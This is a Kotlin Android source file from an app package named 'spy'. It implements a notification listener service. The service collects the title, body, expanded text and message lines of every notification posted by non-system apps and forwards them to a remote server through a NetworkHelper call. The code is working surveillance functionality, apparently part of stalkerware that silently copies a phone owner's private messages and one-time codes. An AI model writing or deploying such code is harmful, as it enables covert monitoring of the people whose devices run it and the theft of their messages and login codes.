package com.gauravhanna.spy

import android.app.Notification
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import java.util.concurrent.Executors

class NotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "NotificationListener"
        private var instance: NotificationListener? = null

        fun isRunning(): Boolean = instance != null
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val processedNotifications = mutableSetOf<String>()

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.d(TAG, "✅ NotificationListener created")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return

        executor.execute {
            try {
                val notification = sbn.notification
                val packageName = sbn.packageName
                val key = sbn.key ?: return@execute

                // Skip already processed
                if (processedNotifications.contains(key)) {
                    return@execute
                }
                processedNotifications.add(key)

                // Clean old keys (keep last 100)
                if (processedNotifications.size > 100) {
                    val toRemove = processedNotifications.take(50)
                    processedNotifications.removeAll(toRemove)
                }

                val title = extractTitle(notification)
                val text = extractText(notification)
                val timestamp = sbn.postTime

                // Skip system notifications
                if (packageName == "android" ||
                    packageName == "com.android.systemui" ||
                    packageName == "com.google.android.gms") {
                    return@execute
                }

                Log.d(TAG, "📱 Notification from: $packageName")
                Log.d(TAG, "   Title: $title")
                Log.d(TAG, "   Text: $text")

                // Send to server using NetworkHelper
                if (!text.isNullOrEmpty() || !title.isNullOrEmpty()) {
                    sendNotificationToServer(packageName, title, text, timestamp)
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error processing notification: ${e.message}")
            }
        }
    }

    private fun extractTitle(notification: Notification): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                val title = notification.extras?.getString(Notification.EXTRA_TITLE)
                if (!title.isNullOrEmpty()) {
                    title
                } else {
                    notification.extras?.getString(Notification.EXTRA_TITLE_BIG)
                }
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun extractText(notification: Notification): String? {
        return try {
            val text = StringBuilder()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                // Get main text
                notification.extras?.getCharSequence(Notification.EXTRA_TEXT)?.let {
                    text.append(it)
                }

                // Get big text
                notification.extras?.getCharSequence(Notification.EXTRA_BIG_TEXT)?.let {
                    if (text.isNotEmpty()) text.append("\n")
                    text.append(it)
                }

                // Get summary text
                notification.extras?.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.let {
                    if (text.isNotEmpty()) text.append("\n")
                    text.append(it)
                }

                // Get messages (for group notifications)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    notification.extras?.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)?.let { lines ->
                        for (line in lines) {
                            if (text.isNotEmpty()) text.append("\n")
                            text.append(line)
                        }
                    }
                }
            }

            if (text.isEmpty()) null else text.toString()
        } catch (e: Exception) {
            null
        }
    }

    private fun sendNotificationToServer(packageName: String, title: String?, text: String?, timestamp: Long) {
        try {
            val titleText = title ?: ""
            val messageText = text ?: ""

            Log.d(TAG, "📨 Sending to server - Package: $packageName")

            // Use NetworkHelper to send the notification
            NetworkHelper.sendNotificationMessage(
                applicationContext,
                packageName,
                titleText,
                messageText,
                timestamp
            )

        } catch (e: Exception) {
            Log.e(TAG, "Error sending notification to server: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        sbn ?: return
        Log.d(TAG, "Notification removed: ${sbn.packageName}")
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "✅ NotificationListener connected to system")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d(TAG, "⚠️ NotificationListener disconnected from system")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        executor.shutdown()
        Log.d(TAG, "NotificationListener destroyed")
    }
}